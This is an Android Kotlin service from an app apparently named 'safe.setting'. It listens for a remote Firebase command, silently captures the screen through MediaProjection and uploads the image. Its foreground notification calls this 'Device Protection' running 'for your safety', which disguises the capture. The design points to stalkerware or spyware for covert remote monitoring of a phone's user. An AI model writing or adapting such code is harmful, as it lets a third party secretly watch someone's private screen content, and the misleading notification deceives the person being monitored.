package com.safe.setting.app.services.screenshot

import android.annotation.SuppressLint
import android.app.Activity
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.DisplayMetrics
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.ValueEventListener
import com.safe.setting.app.R
import com.safe.setting.app.data.rxFirebase.InterfaceFirebase
import com.safe.setting.app.services.base.BaseService
import com.safe.setting.app.utils.Consts
import io.reactivex.rxjava3.disposables.Disposable
import java.io.File
import java.io.FileOutputStream
import java.util.Date
import javax.inject.Inject

class ScreenshotListenerService : BaseService(), InterfaceServiceScreenshot {

    @Inject
    lateinit var interactor: InterfaceInteractorScreenshot<InterfaceServiceScreenshot>
    @Inject
    lateinit var firebase: InterfaceFirebase

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private lateinit var mediaProjectionManager: MediaProjectionManager
    private lateinit var screenshotListener: ValueEventListener

    companion object {
        private var resultCode: Int = Activity.RESULT_CANCELED
        private var resultData: Intent? = null

        fun startServiceWithPermission(context: Context, resCode: Int, resData: Intent) {
            resultCode = resCode
            resultData = resData
            val startIntent = Intent(context, ScreenshotListenerService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(startIntent)
            } else {
                context.startService(startIntent)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        getComponent()!!.inject(this)
        interactor.onAttach(this)
        mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground()

        if (mediaProjection == null && resultCode == Activity.RESULT_OK && resultData != null) {
            setupMediaProjection()
        }

        listenForCommand()

        return START_STICKY
    }

    private fun listenForCommand() {
        val ref = firebase.getDatabaseReference(Consts.TAKE_SCREENSHOT)
        screenshotListener = object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                if (snapshot.exists() && snapshot.getValue(Boolean::class.java) == true) {
                    takeScreenshot()
                    snapshot.ref.setValue(false)
                }
            }
            override fun onCancelled(error: DatabaseError) {}
        }
        ref.addValueEventListener(screenshotListener)
    }

    private fun setupMediaProjection() {
        mediaProjection = mediaProjectionManager.getMediaProjection(resultCode, resultData!!)
    }

    @SuppressLint("WrongConstant", "UseKtx")
    private fun takeScreenshot() {
        if (mediaProjection == null) return

        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val width: Int
        val height: Int

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val metrics = windowManager.currentWindowMetrics
            width = metrics.bounds.width()
            height = metrics.bounds.height()
        } else {
            val metrics = DisplayMetrics()
            @Suppress("DEPRECATION")
            windowManager.defaultDisplay.getMetrics(metrics)
            width = metrics.widthPixels
            height = metrics.heightPixels
        }
        val density = resources.displayMetrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "Screenshot", width, height, density,
            0, imageReader?.surface, null, null
        )

        Handler(Looper.getMainLooper()).postDelayed({
            val image = imageReader?.acquireLatestImage()
            if (image != null) {
                val planes = image.planes
                val buffer = planes[0].buffer
                val pixelStride = planes[0].pixelStride
                val rowStride = planes[0].rowStride
                val rowPadding = rowStride - pixelStride * width

                val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
                bitmap.copyPixelsFromBuffer(buffer)
                image.close()

                saveBitmap(bitmap)
            }
            virtualDisplay?.release()
            imageReader?.close()
        }, 500)
    }

    private fun saveBitmap(bitmap: Bitmap) {
        val file = File(cacheDir, "screenshot_${Date().time}.jpeg")
        val fos = FileOutputStream(file)
        bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos)
        fos.flush()
        fos.close()
        interactor.uploadScreenshot(file)
    }

    private fun startForeground() {
        val channelId = "screenshot_service_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "Screenshot Service", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
        }
        val notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Device Protection")
            .setContentText("Service is running for your safety.")
            .setSmallIcon(R.mipmap.ic_vv_round)
            .build()
        startForeground(111, notification)
    }

    override fun onDestroy() {
        firebase.getDatabaseReference(Consts.TAKE_SCREENSHOT).removeEventListener(screenshotListener)
        mediaProjection?.stop()
        interactor.onDetach()
        super.onDestroy()
    }

    override fun addDisposable(disposable: Disposable) {}
    override fun clearDisposable() {}
}
